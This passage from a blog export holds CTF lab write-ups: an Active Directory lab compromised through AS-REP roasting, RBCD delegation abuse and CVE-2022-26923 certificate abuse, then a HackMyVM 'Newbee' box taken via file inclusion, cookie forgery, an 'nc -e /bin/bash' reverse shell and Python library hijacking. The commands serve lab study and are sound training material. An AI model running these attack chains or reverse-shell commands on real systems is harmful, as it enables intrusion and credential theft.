chenjianhua@xiaorang.lab doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n~~~\n\nè¿”å›äº†ä¸¤ä¸ªç¥¨æ®, ç”¨ hashcat çˆ†ç ´\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# hashcat -m 18200 user.txt /usr/share/wordlists/rockyou.txt --show\n[proxychains] DLL init: proxychains-ng 4.17\n$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:dbd1dee4c07eea9541a9f1af91b93180$ b4d238908b8d37009f9dfb5402a13f1b60567f4f8185fbbf5c9fbefe14bbe0b1f89980cd604ff68b572afe6af2d1bb4d6720abc8bdc51e47df9da3ebb4801d08f8be90c12343699eff8855dbfc0d63e796ffcec62169fa4e3ee97440ca0eb2eb985e6785f93aa1d34444235b1ce8937acf0121fe05ec2c589ba625fab1c90bd168637124f99378007fa9c459b07f946a65d3c7131cdad16af4b591becc04526125e2c255072df4a32214d393aab5f27cff28b66859c1b9bb06600d4c7a51cd7ae583d4602fd1ebd6ffc269ee60ed861abb28bb547de5e848955d5279d9e08523edb67fbd171d1af1730f2fba: winniethepooh\n$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:c640ad4dd669f00b128bad8d1ef8df86$ 0b8e74c7b36ec7daceb707ce176d18a8d15f8cd3ba3154f8ae4f29e9e54f538ab19bc766ea554698677d7f1e6f9418fd7419d82a1ca79582ed70f3de5b5c771a6e7df373fc84a9921b697e7c7d42c17e85f1b2ae73b1ec15bf1bbc59e20bfb2d4e5e52c53c1e88da9c0815434acd8298948f7becb0f15bfdcce4153d025570249523f7507c20f694f5e0ec23c8e7ef5d446aa5fec15315ab314658fc36befc39d7cdf037fa1f165a83ab257fa34a17c4b512ccca27284b97d8f7bdf51cdb0a069e2df4f952c3c52fa47fb58a0fe4e80d0907062fad92edf4d799306ddb103468accf1c2a6b172f2bd7d7c61d: 1qaz2wsx\n~~~\n\nç”¨ bloodhound è¿›è¡ŒåŸŸå†…ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# bloodhound-python -u lixiuying -p winniethepooh -d xiaorang.lab -dc XR-DC01.xiaorang.lab -c all --dns-tcp -ns 172.22.15.13 --auth-method ntlm --zip\nINFO: Found AD domain: xiaorang.lab\nINFO: Connecting to LDAP server: XR-DC01.xiaorang.lab\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: XR-DC01.xiaorang.lab\nINFO: Found 37 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: XR-CA.xiaorang.lab\nINFO: Querying computer: XR-0687.xiaorang.lab\nINFO: Querying computer: XR-DC01.xiaorang.lab\nINFO: Done in 00M 05S\nINFO: Compressing output into 20250402040344_bloodhound.zip\n~~~\n\nåŸŸç”¨æˆ· LIXIUYING å¯¹è®¡ç®—æœº XR-0687$ å…·æœ‰ Generic Write æƒé™\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%983.png)\n\nå¯ä»¥é€šè¿‡ä¿®æ”¹ç›®æ ‡çš„ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§ï¼ˆé…ç½® RBCDï¼‰è·å–ç›®æ ‡ SYSTEM æƒé™ã€‚\n\næ·»åŠ ä¸€ä¸ªæœºå™¨ç”¨æˆ·\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-addcomputer -computer-name 'EVILCOMPUTER$' -computer-pass '123@#ABC' -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 \" xiaorang.lab/lixiuying: winniethepooh \"\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Successfully added machine account EVILCOMPUTER$ with password 123@#ABC.\n~~~\n\nç„¶åé…ç½® RBCDï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-rbcd xiaorang.lab/lixiuying: winniethepooh -action write -delegate-from \"EVILCOMPUTER $\" -delegate-to \"XR-0687$\" -dc-ip 172.22.15.13\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] EVILCOMPUTER $ can now impersonate users on XR-0687$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     EVILCOMPUTER$   (S-1-5-21-3745972894-1678056601-2622918667-1147)\n~~~\n\nè¯·æ±‚å¹¶å†’å……åŸŸç®¡æƒé™çš„æœåŠ¡ç¥¨æ®ï¼š\n\n```\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-getST xiaorang.lab/EVILCOMPUTER$:'123@#ABC' -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating Administrator\n/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[*] Requesting S4U2self\n/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache\n```\n\n~~~\nâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€#  export KRB5CCNAME = Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-psexec 'xiaorang.lab/administrator@XR-0687.xiaorang.lab' -target-ip 172.22.15.35 -codec gbk -no-pass -k\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Requesting shares on 172.22.15.35.....\n[*] Found writable share ADMIN$\n[*] Uploading file RHzxEZPZ.exe\n[*] Opening SVCManager on 172.22.15.35.....\n[*] Creating service etRo on 172.22.15.35.....\n[*] Starting service etRo.....\n[!] Press help for extra shell commands\nMicrosoft Windows [ç‰ˆæœ¬ 10.0.20348.1668]\n(c) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚\n\nC:\\Windows\\system32 >\n~~~\n\nflag03 åœ¨ C:\\users\\Administrator\\flag\\\n\nä¸»æœº 172.22.15.18 (XR-CA) å­˜åœ¨ `CVE-2022-26923` æ¼æ´\n\næ‰“ CVE-2022â€“26923\n\næŸ¥æ‰¾è¯ä¹¦æœåŠ¡å™¨ï¼Œå¹¶å°è¯•æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„è¯ä¹¦æ¨¡æ¿ï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -vulnerable -stdout\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'xiaorang-XR-CA-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'xiaorang-XR-CA-CA' via CSRA: Could not connect: [Errno 111] Connection refused\n[*] Trying to get CA configuration for 'xiaorang-XR-CA-CA' via RRP\n[!] Got error while trying to get CA configuration for 'xiaorang-XR-CA-CA' via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused\n[!] Failed to get CA configuration for 'xiaorang-XR-CA-CA'\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : xiaorang-XR-CA-CA\n    DNS Name                            : XR-CA.xiaorang.lab\n    Certificate Subject                 : CN = xiaorang-XR-CA-CA, DC = xiaorang, DC = lab\n    Certificate Serial Number           : 3ECFB0112E93BE9041059FA6DBB3C35A\n    Certificate Validity Start          : 2023-06-03 07:19:59+00:00\n    Certificate Validity End            : 2028-06-03 07:29:58+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Unknown\n    Request Disposition                 : Unknown\n    Enforce Encryption for Requests     : Unknown\nCertificate Templates                   : [!] Could not find any certificate templates\n\n~~~\n\nä½¿ç”¨ certipy åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶å°†è¯¥æœºå™¨è´¦æˆ· dNSHostName å±æ€§æŒ‡å‘åŸŸæ§ï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user 'EVILCOMPUTER2$' -pass '123@#ABC' -dns 'XR-DC01.xiaorang.lab'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Creating new account:\n    sAMAccountName                      : EVILCOMPUTER2$\n    unicodePwd                          : 123@#ABC\n    userAccountControl                  : 4096\n    servicePrincipalName                : HOST/EVILCOMPUTER2\n                                          RestrictedKrbHost/EVILCOMPUTER2\n    dnsHostName                         : XR-DC01.xiaorang.lab\n[*] Successfully created account 'EVILCOMPUTER2$' with password '123@#ABC'\n\n~~~\n\nä½¿ç”¨è¯¥æœºå™¨è´¦æˆ·å‘ AD CS æœåŠ¡å™¨è¯·æ±‚åŸŸæ§æœºå™¨çš„è¯ä¹¦æ¨¡æ¿ï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# certipy-ad req -u EVILCOMPUTER2\\$@xiaorang.lab -p '123@#ABC' -target 172.22.15.18 -ca \"xiaorang-XR-CA-CA\" -template Machine\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 7\n[*] Got certificate with DNS Host Name 'XR-DC01.xiaorang.lab'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'xr-dc01.pfx'\n~~~\n\nç”¨ç”³è¯·åˆ°çš„è¯ä¹¦ï¼Œç”³è¯·åŸŸæ§çš„ TGTï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: xr-dc01$@xiaorang.lab\n[*] Trying to get TGT...\n[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)\n~~~\n\nä½¿ç”¨ certipy è¯·æ±‚ TGT å¤±è´¥ï¼Œå‡ºç° `KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)` é”™è¯¯ã€‚\n\n[bloodyAD](https://github.com/CravateRouge/bloodyAD) ä½¿ç”¨è¯ä¹¦è¿›è¡Œè®¤è¯ï¼Œé…ç½® RBCD è¿›è¡Œæ”»å‡»ï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# certipy-ad cert -pfx xr-dc01.pfx > xr-dc01.pem\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# bloodyAD -d xiaorang.lab -u 'EVILCOMPUTER2 $' -c ':xr-dc01.pem' --host 172.22.15.13 --secure add rbcd 'xr-dc01$' 'EVILCOMPUTER2$'\n[!] No security descriptor has been returned, a new one will be created\n[+] EVILCOMPUTER2 $ can now impersonate users on xr-dc01$ via S4U2Proxy\n~~~\n\nè¯·æ±‚å¹¶å†’å……åŸŸç®¡æƒé™çš„æœåŠ¡ç¥¨æ®ï¼š\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-getST 'xiaorang.lab/EVILCOMPUTER2$: 123@#ABC' -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator\n -dc-ip 172.22.15.13\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Getting TGT for user\n[*] Impersonating Administrator\n/usr/share/doc/python3-impacket/examples/getST.py: 380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py: 477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)\n[*] Requesting S4U2self\n/usr/share/doc/python3-impacket/examples/getST.py: 607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow()\n/usr/share/doc/python3-impacket/examples/getST.py: 659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# export KRB5CCNAME = Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccache\n\nDCSync ä»åŸŸæ§å¯¼å‡ºå‡­æ®ï¼š\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-secretsdump 'xiaorang.lab/administrator@XR-DC01.xiaorang.lab' -target-ip 172.22.15.13 -no-pass -k -just-dc-user Administrator\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\n[-] 'NoneType' object has no attribute 'getRemoteHost'\n[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter\n[*] Cleaning up...\n\nPTH ç™»å½•åŸŸæ§ï¼š\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-psexec 'xiaorang.lab/administrator@XR-DC01.xiaorang.lab' -target-ip 172.22.15.13 -codec gbk -no-pass -k\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\n[*] Requesting shares on 172.22.15.13.....\n[*] Found writable share ADMIN$\n[*] Uploading file FavsxEaA.exe\n[*] Opening SVCManager on 172.22.15.13.....\n[*] Creating service fjnA on 172.22.15.13.....\n[*] Starting service fjnA.....\n[!] Press help for extra shell commands\nMicrosoft Windows [ç‰ˆæœ¬ 10.0.14393]\n(c) 2016 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚\n\nC:\\windows\\system32 > \n~~~\n\nflag åœ¨ C:\\Users\\Administrator\\flag ä¸‹\n\n# å‚è€ƒ\n\nhttps://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting\n\nhttps://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/\n\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"Hackmyvm-Newbee","url":"/2025/03/26/Hackmyvm-Newbee/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\narp-scan -l\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:f5:b9:af       PCS Systemtechnik GmbH\n192.168.31.122  00:0c:29:71:20:21       VMware, Inc.\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.384 seconds (107.38 hosts/sec). 3 responded\n\n~~~\n\n192.168.31.122å°±æ˜¯ipåœ°å€\n\nnmap 192.168.31.122 -p-æ‰«æç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.122 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 08:21 EDT\nNmap scan report for 192.168.31.122\nHost is up (0.00090s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 00:0C:29:71:20:21 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 6.71 seconds\n~~~\n\n# 80ç«¯å£\n\næŸ¥çœ‹é¡µé¢æºç ï¼Œåœ¨æœ€ä¸‹é¢å¯ä»¥å‘ç°æœ‰ä¸€ä¸ª\n\n~~~\n<!--Wrong paramter to GET-->\n~~~\n\nå¯¹getå‚æ•°è¿›è¡Œfuzz\n\n~~~\n\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u \"http://192.168.31.122?FUZZ=/etc/passwd\" --hh 18851\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.31.122?FUZZ=/etc/passwd/\nTotal requests: 220559\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000001799:   200        376 L    1270 W     18863 Ch    \"hack\"\n~~~\n\nèƒ½fuzzå‡ºæ¥å‚æ•°åä¸ºhackï¼Œä½†æ˜¯é¡µé¢æœ€ä¸‹æ–¹è¿˜æ˜¯ä¼šæŠ¥é”™\n\n~~~\n<!-- include failed try another file -->\n~~~\n\nå°è¯•åŒ…å«å…¶ä»–æ–‡ä»¶\n\næ‰«æç›®å½•å¯ä»¥æ‰«æåˆ°ä¸€ä¸ªsecret.php\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.122/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .php,.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.122/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 279]\n/index.php            (Status: 200) [Size: 18852]\n/contact.php          (Status: 200) [Size: 8853]\n/about.php            (Status: 200) [Size: 10036]\n/blog.php             (Status: 200) [Size: 9782]\n/products.php         (Status: 200) [Size: 12163]\n/terms.php            (Status: 200) [Size: 6670]\n/assets               (Status: 301) [Size: 317] [--> http://192.168.31.122/assets/]\n/testimonials.php     (Status: 200) [Size: 7907]\n/javascript           (Status: 301) [Size: 321] [--> http://192.168.31.122/javascript/]\n/checkout.php         (Status: 200) [Size: 13307]\n/secret.php           (Status: 200) [Size: 2187]\n/.php                 (Status: 403) [Size: 279]\n/server-status        (Status: 403) [Size: 279]\n~~~\n\nsecret.phpå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å¿…é¡»è¦å…ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Œç”¨lfiåŒ…å«secret.phpè¯•è¯•\n\n~~~\nhttp://192.168.31.122/?hack=php://filter/convert.base64-encode/resource=secret.php\n~~~\n\nå¯ä»¥åŒ…å«å‡ºæ¥\n\n~~~\n#secret.php\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>å‘½ä»¤è¡Œæ§åˆ¶å°</title>\n    <style>\n        body {\n            background-color: #1e1e1e;\n            font-family: Consolas, monospace;\n            color: #fff;\n            margin: 0;\n            padding: 0;\n        }\n\n        .console {\n            width: 80%;\n            margin: 50px auto;\n            padding: 20px;\n            background-color: #000;\n            border-radius: 8px;\n            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);\n            height: 400px;\n            overflow-y: auto;\n            font-size: 16px;\n        }\n\n        .output {\n            white-space: pre-wrap;\n            margin-bottom: 10px;\n        }\n\n        .input-container {\n            display: flex;\n            align-items: center;\n        }\n\n        .input-container .prompt {\n            color: #00ff00;\n            margin-right: 5px;\n        }\n\n        .input-container input {\n            background: transparent;\n            border: none;\n            color: #fff;\n            width: 100%;\n            padding: 5px;\n            font-size: 16px;\n            outline: none;\n        }\n\n        .input-container input:focus {\n            border: 1px solid #00ff00;\n        }\n\n        .input-container input::placeholder {\n            color: #888;\n        }\n\n        .console-footer {\n            padding-top: 10px;\n            color: #888;\n            font-size: 12px;\n            text-align: center;\n        }\n    </style>\n</head>\n<body>\n\n<div class=\"console\">\n    <div class=\"output\" id=\"output\">\n        <?php\n\n        if (isset($_COOKIE['AreYouAdmin']) && $_COOKIE['AreYouAdmin'] === 'Yes') {\n\n            if (isset($_GET['command'])) {\n                $command = $_GET['command'];\n                $output = shell_exec($command);\n                echo '<div>\\> ' . htmlspecialchars($command) . '</div>';\n                echo '<div>' . nl2br(htmlspecialchars($output)) . '</div>';\n            }\n        } else {\n            echo '<div>No permission to execute commands, lacking admin permission.</div>';\n        }\n        ?>\n    </div>\n\n    <div class=\"input-container\">\n        <span class=\"prompt\">\\></span>\n        <form method=\"get\">\n            <input type=\"text\" name=\"command\" id=\"input\" placeholder=\"command...\" autocomplete=\"off\">\n        </form>\n    </div>\n</div>\n\n<script>\n    const inputField = document.getElementById(\"input\");\n\n    inputField.focus();\n</script>\n\n</body>\n</html>\n~~~\n\nä¼ªé€ cookie\n\n~~~\nCookie: AreYouAdmin=yes\n~~~\n\nç„¶ååå¼¹shell\n\n~~~\nnc -e /bin/bash 192.168.31.129 4444\nscript -qc /bin/bash /dev/null #è·å¾—äº¤äº’å¼shell\n~~~\n\n# ææƒ\n\n~~~\nwww-data@Newbee:/var/www/html/shop$ sudo -l\nsudo: unable to resolve host Newbee: Temporary failure in name resolution\nMatching Defaults entries for www-data on Newbee:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    targetpw, use_pty\n\nUser www-data may run the following commands on Newbee:\n    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py\n~~~\n\n~~~\n#vuln.py\nimport random\nimport time\nimport math\nimport string\nimport datetime\n\ndef generate_random_string(length=10):\n\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\n\ndef pointless_computation():\n\n    number = random.randint(1, 1000)\n    result = math.sqrt(number) * math.log(number)\n    print(f\"Calculated math nonsense: sqrt({number}) * log({number}) = {result}\")\n\ndef simulate_time_wasting():\n\n    now = datetime.datetime.now()\n    print(f\"Started wasting time at {now}\")\n    time.sleep(2)  # æ•…æ„ç¡çœ  2 ç§’\n    later = datetime.datetime.now()\n    print(f\"Finished wasting time at {later}. Time wasted: {later - now}\")\n\ndef pointless_string_operations():\n\n    rand_str = generate_random_string()\n    print(f\"Generated random string: {rand_str}\")\n    reversed_str = rand_str[::-1]\n    print(f\"Reversed string: {reversed_str}\")\n    print(f\"String length: {len(rand_str)}\")\n\nif __name__ == \"__main__\":\n    pointless_computation()\n    simulate_time_wasting()\n    pointless_string_operations()\n    print(\"All done. The script accomplished nothing useful.\")\n~~~\n\nå¯ä»¥åœ¨/var/www/htmlç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªrandom.pyæ–‡ä»¶è¿›è¡ŒåŠ«æŒï¼Œpythonæ–‡ä»¶ä¼šä¼˜å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åº“\n\n~~~\n#random.py\nimport os\nos.system(\"bash -p\")\n~~~\n\n~~~\nwww-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py\ndebian@Newbee:/var/www/html$\n~~~\n\næåˆ°debianç”¨æˆ·äº†ï¼Œhomeç›®å½•ä¸‹æœ‰ä¸€ä¸ªnote.txtå’Œä¸€ä¸ªconfig.php\n\n~~~\ndebian@Newbee:~$ cat note.txt\nDamn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me\n~~~\n\n~~~\ndebian@Newbee:~$ cat config.php\n<?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"\n\n\n$conn = new mysqli($servername, $username, $password);\n\n............\n............\n~~~\n\nè¦æ‹¿åˆ°æ•°æ®åº“çš„å¯†ç \n\næŸ¥çœ‹ç«¯å£\n\n~~~\ndebian@Newbee:~$ ss -lntup\nNetid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process\nudp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*\ntcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*\ntcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*\ntcp    LISTEN  0       128          127.0.0.1:5000        0.0.0.0:*\ntcp    LISTEN  0       128               [::]:22             [::]:*\ntcp    LISTEN  0       511                  *:80                *:*\n~~~\n\nå¯ä»¥å‘ç°æœ¬åœ°æœ‰5000ç«¯å£ï¼Œç”¨socatå°†5000ç«¯å£è½¬å‘å‡ºå»\n\n~~~\ndebian@Newbee:~$ socat TCP-LISTEN:5001,fork TCP4:127.0.0.1:5000\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/Newbee1.png)\n\næ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œç™»å½•å¤„é™¤äº†adminï¼Œå…¶ä»–çš„éƒ½å¯ä»¥éšæ„ç™»å½•ï¼Œcookieé‡Œæœ‰ä¸€ä¸ªjwtï¼Œå¯ä»¥çŒœæµ‹æ˜¯jwtä¼ªé€ \n\nå¯ä»¥ç”¨hashcatçˆ†ç ´\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# hashcat -a 0 -m 16500 ./1 /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 